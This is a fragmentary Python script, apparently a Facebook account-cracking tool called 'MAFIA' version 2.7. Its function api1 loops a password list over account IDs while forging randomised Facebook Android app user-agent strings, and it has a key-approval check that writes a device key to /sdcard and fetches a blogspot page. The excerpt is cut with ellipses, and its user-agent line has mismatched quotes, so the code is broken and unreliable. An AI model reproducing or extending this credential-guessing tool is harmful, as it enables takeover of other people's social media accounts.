...
#print('\x1b[1;92m[✓] PLEASE WAIT CHECKING UPDATE MAFIA ...')
#os.system("espeak -a 300 \"PLEASE,WAIT,CHECKING,UPDATE,MAFIA\"")
...
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVERSION : \033[1;32m2.7
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def menu():
        ...
        #    linex()
            ...
            if xd in ['1','01']:
                ...
                linex()
                print(' \033[1;32m[\033[1;37m1\033[1;32m] \033[1;37mMethod \033[1;32m[MIX] ')
...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 10 Build/7544; Samsung Galaxy S21) [FBAN/905.2.9.0;FBBV/626483752;FBRV/7;com.facebook.mlite;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=470,height=1517};FB_FW/2;]','Dalvik/2.1.0 (Linux; U; Android 10 Build/2455; Samsung Galaxy S21) [FBAN/458.9.8.0;FBBV/738565918;FBRV/3;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=1028,height=1137};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 12 Build/5750; Xiaomi Redmi Note 10) [FBAN/483.8.9.0;FBBV/440308528;FBRV/9;com.facebook.katana;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3,width=1141,height=636};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 10 Build/6503; Xiaomi POCO X3) [FBAN/251.5.7.0;FBBV/958880481;FBRV/7;com.facebook.katana;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/POCO X3;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3,width=986,height=682};FB_FW/2;]"
                li = ['28','29','210']
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/MAFIA/.MAFIA.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/MAFIA/.MAFIA.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        ...
        os.system('clear')
    r1 = requests.get('https://mafia166.blogspot.com/2023/12/blog-post.html').text
